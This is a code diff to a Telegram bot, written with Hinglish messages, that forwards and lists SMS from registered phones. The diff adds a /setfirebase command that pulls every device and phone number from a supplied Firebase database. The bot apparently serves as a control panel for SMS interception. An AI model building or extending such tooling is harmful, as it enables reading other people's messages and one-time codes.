@@ -13,6 +13,8 @@ from app.services import (
     get_monitoring_user_ids,
     list_devices_with_counts,
     register_device,
+    get_monitor_profile,
+    set_firebase_url,
     set_user_phone,
     start_monitoring,
     stop_monitoring,
@@ -49,7 +51,8 @@ def format_device_line(device: Device, sms_count: int) -> str:
         if device.last_seen
         else "Never"
     )
-    return f"{icon} `{device.name}` — {sms_count} SMS | last: {last_seen}"
+    source = " 🔥" if device.firebase_key else ""
+    return f"{icon} `{device.name}`{source} — {sms_count} SMS | last: {last_seen}"
 
 
 async def notify_new_sms(sms: SMSMessage) -> None:
@@ -91,6 +94,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         "/mynum <number> - Apna number set karo\n"
         "/startmonitar - SMS forwarding start\n"
         "/stopmonitar - SMS forwarding stop\n"
+        "/setfirebase <url> - Firebase attach karo\n"
         "/a <deviceid> - Apni device add/claim karo\n"
         "/devices - Apni saari devices dekho\n"
         "/device <name> - Ek device ke SMS dekho\n"
@@ -115,6 +119,9 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "/mynum 9876543210 - Apna SIM number set karo\n"
         "/startmonitar - Is number ke saare SMS forward\n"
         "/stopmonitar - Forwarding band karo\n\n"
+        "*Firebase:*\n"
+        "/setfirebase https://project.firebaseio.com\n"
+        "/devices - Firebase ki saari devices dikhegi\n\n"
         "*Device commands:*\n"
         "/a myphone - Apni device add/claim karo\n"
         "/devices - Meri devices list\n"
@@ -209,6 +216,51 @@ async def stopmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     )
 
 
+async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "Usage: `/setfirebase <firebase-url>`\n\n"
+            "Example:\n"
+            "`/setfirebase https://myapp.firebaseio.com`\n"
+            "`/setfirebase https://myapp.firebaseio.com/devices`",
+            parse_mode="Markdown",
+        )
+        return
+
+    firebase_url = " ".join(context.args)
+    db: Session = SessionLocal()
+    try:
+        profile, devices = await set_firebase_url(db, user.id, firebase_url)
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}")
+        return
+    except Exception as exc:
+        logger.error("Firebase sync failed: %s", exc)
+        await update.message.reply_text(f"❌ Firebase error: {exc}")
+        return
+    finally:
+        db.close()
+
+    lines = [
+        f"✅ *Firebase Attached!*\n",
+        f"🔗 URL: `{profile.firebase_url}`",
+        f"📱 Total devices: *{len(devices)}*\n",
+    ]
+    for device in devices[:30]:
+        phone = f"+{device.phone_number}" if device.phone_number else "N/A"
+        lines.append(f"🔥 `{device.name}` | {phone}")
+
+    if len(devices) > 30:
+        lines.append(f"\n... aur {len(devices) - 30} devices")
+
+    lines.append("\n`/devices` se saari devices dekho.")
+    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
+
+
 async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user = update.effective_user
     if not is_authorized(user.id if user else None):
@@ -261,6 +313,7 @@ async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
     db: Session = SessionLocal()
     try:
+        profile = get_monitor_profile(db, user.id)
         items = list_devices_with_counts(db, owner_telegram_id=user.id)
     finally:
         db.close()
@@ -268,13 +321,17 @@ async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     if not items:
         await update.message.reply_text(
             "📭 Abhi tumhari koi device nahi hai.\n\n"
-            "Add karo: `/a my-phone`\n"
-            "Ya pehle SMS forward karo, phir `/a deviceid` se claim karo.",
+            "Firebase: `/setfirebase <url>`\n"
+            "Manual: `/a my-phone`\n"
+            "Ya SMS forward karo, phir `/a deviceid` se claim karo.",
             parse_mode="Markdown",
         )
         return
 
-    lines = ["📱 *Meri Devices*\n"]
+    header = "📱 *Meri Devices*"
+    if profile and profile.firebase_url:
+        header += f"\n🔥 Firebase: `{profile.firebase_url}`"
+    lines = [header + "\n"]
     for item in items:
         lines.append(format_device_line(item["device"], item["sms_count"]))
 
@@ -447,6 +504,7 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("mynum", mynum_command))
     app.add_handler(CommandHandler("startmonitar", startmonitar_command))
     app.add_handler(CommandHandler("stopmonitar", stopmonitar_command))
+    app.add_handler(CommandHandler("setfirebase", setfirebase_command))
     app.add_handler(CommandHandler("a", a_command))
     app.add_handler(CommandHandler("devices", devices_command))
     app.add_handler(CommandHandler("device", device_command))
